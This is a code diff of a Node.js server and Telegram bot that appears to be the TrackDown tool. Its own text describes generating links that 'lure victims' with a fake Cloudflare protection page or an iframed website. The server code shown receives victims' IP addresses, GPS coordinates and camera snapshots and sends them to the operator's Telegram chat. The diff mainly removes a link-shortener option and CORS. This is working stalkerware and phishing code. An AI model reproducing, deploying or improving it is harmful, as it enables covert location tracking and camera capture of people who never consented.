@@ -1,8 +1,7 @@
 const fs = require("fs");
 const express = require("express");
-var cors = require('cors');
 var bodyParser = require('body-parser');
-const fetch = require('node-fetch');
+
 const TelegramBot = require('node-telegram-bot-api');
 const bot = new TelegramBot(process.env["bot"], {polling: true});
 var jsonParser=bodyParser.json({limit:1024*1024*20, type:'application/json'});
@@ -10,13 +9,11 @@ var urlencodedParser=bodyParser.urlencoded({ extended:true,limit:1024*1024*20,ty
 const app = express();
 app.use(jsonParser);
 app.use(urlencodedParser);
-app.use(cors());
 app.set("view engine", "ejs");
 
 //Modify your URL here
-var hostURL="YOUR URL";
-//TOGGLE for Shorters
-var use1pt=false;
+var hostURL="YOUR URL"
+
 
 
 
@@ -25,9 +22,10 @@ var ip;
 var d = new Date();
 d=d.toJSON().slice(0,19).replace('T',':');
 if (req.headers['x-forwarded-for']) {ip = req.headers['x-forwarded-for'].split(",")[0];} else if (req.connection && req.connection.remoteAddress) {ip = req.connection.remoteAddress;} else {ip = req.ip;}
-  
+
+
 if(req.params.path != null){
-res.render("webview",{ip:ip,time:d,url:atob(req.params.uri),uid:req.params.path,a:hostURL,t:use1pt});
+res.render("webview",{ip:ip,time:d,url:atob(req.params.uri),uid:req.params.path});
 } 
 else{
 res.redirect("https://t.me/th30neand0nly0ne");
@@ -45,7 +43,7 @@ if (req.headers['x-forwarded-for']) {ip = req.headers['x-forwarded-for'].split("
 
 
 if(req.params.path != null){
-res.render("cloudflare",{ip:ip,time:d,url:atob(req.params.uri),uid:req.params.path,a:hostURL,t:use1pt});
+res.render("cloudflare",{ip:ip,time:d,url:atob(req.params.uri),uid:req.params.path});
 } 
 else{
 res.redirect("https://t.me/th30neand0nly0ne");
@@ -57,10 +55,9 @@ res.redirect("https://t.me/th30neand0nly0ne");
 
 
 
-bot.on('message', async (msg) => {
+bot.on('message', (msg) => {
 const chatId = msg.chat.id;
 
- 
 
 if(msg?.reply_to_message?.text=="🌐 Enter Your URL"){
  createLink(chatId,msg.text); 
@@ -81,7 +78,7 @@ bot.sendMessage(chatId,` Through this bot you can track people just by sending a
 to begin , afterwards it will ask you for a URL which will be used in iframe to lure victims.\nAfter receiving
 the url it will send you 2 links which you can use to track people.
 \n\nSpecifications.
-\n1. Cloudflare Link: This method will show a cloudflare under attack page to gather informations and afterwards victim will be redirected to destinationed URL.
+\n1. Cloudflare Link: This method will show a cloudflare under attack page to garher informations and afterwards victim will be redirected to destinationed URL.
 \n2. Webview Link: This will show a website (ex bing , dating sites etc) using iframe for gathering information.
 ( ⚠️ Many sites may not work under this method if they have x-frame header present.Ex https://google.com )
 \n\nThe project is OSS at: https://github.com/Th30neAnd0nly/TrackDown
@@ -98,15 +95,14 @@ createNew(callbackQuery.message.chat.id);
 } 
 });
 bot.on('polling_error', (error) => {
-//console.log(error.code); 
+console.log(error.code); 
 });
 
 
 
 
 
-
-async function createLink(cid,msg){
+function createLink(cid,msg){
 
 var encoded = [...msg].some(char => char.charCodeAt(0) > 127);
 
@@ -118,31 +114,9 @@ var m={
     "inline_keyboard":[[{text:"Create new Link",callback_data:"crenew"}]]
   } )
 };
-
-var cUrl=`${hostURL}/c/${url}`;
-var wUrl=`${hostURL}/w/${url}`;
   
-bot.sendChatAction(cid,"typing");
-if(use1pt){
-var x=await fetch(`https://short-link-api.vercel.app/?query=${encodeURIComponent(cUrl)}`).then(res => res.json());
-var y=await fetch(`https://short-link-api.vercel.app/?query=${encodeURIComponent(wUrl)}`).then(res => res.json());
-
-var f="",g="";
-
-for(var c in x){
-f+=x[c]+"\n";
-}
-
-for(var c in y){
-g+=y[c]+"\n";
-}
-  
-bot.sendMessage(cid, `New links has been created successfully.You can use any one of the below links.\nURL: ${msg}\n\n✅Your Links\n\n🌐 CloudFlare Page Link\n${f}\n\n🌐 WebView Page Link\n${g}`,m);
-}
-else{
-
-bot.sendMessage(cid, `New links has been created successfully.\nURL: ${msg}\n\n✅Your Links\n\n🌐 CloudFlare Page Link\n${cUrl}\n\n🌐 WebView Page Link\n${wUrl}`,m);
-}
+bot.sendMessage(cid, `New links has been created successfully.\nURL: ${msg}\n\n✅Your Links\n\n🌐 CloudFlare Page Link\n${hostURL}/c/${url}\n\n🌐 WebView Page Link\n${hostURL}/w/${url}`,m);
+ 
 }
 else{
 bot.sendMessage(cid,`⚠️ Please Enter a valid URL , including http or https.`);
@@ -165,8 +139,10 @@ bot.sendMessage(cid,`🌐 Enter Your URL`,mk);
 
 app.get("/", (req, res) => {
 var ip;
+var d = new Date();
+d=d.toJSON().slice(0,19).replace('T',':');
 if (req.headers['x-forwarded-for']) {ip = req.headers['x-forwarded-for'].split(",")[0];} else if (req.connection && req.connection.remoteAddress) {ip = req.connection.remoteAddress;} else {ip = req.ip;}
-res.json({"ip":ip});
+res.send(ip);
 
   
 });
@@ -180,8 +156,7 @@ var lon=parseFloat(decodeURIComponent(req.body.lon)) || null;
 var uid=decodeURIComponent(req.body.uid) || null;
 var acc=decodeURIComponent(req.body.acc) || null;
 if(lon != null && lat != null && uid != null && acc != null){
-
-bot.sendLocation(parseInt(uid,36),lat,lon);
+  bot.sendLocation(parseInt(uid,36),lat,lon);
 
 bot.sendMessage(parseInt(uid,36),`Latitude: ${lat}\nLongitude: ${lon}\nAccuracy: ${acc} meters`);
   
@@ -214,7 +189,7 @@ var img=decodeURIComponent(req.body.img) || null;
 if( uid != null && img != null){
   
 var buffer=Buffer.from(img,'base64');
-  
+
 var info={
 filename:"camsnap.png",
 contentType: 'image/png'
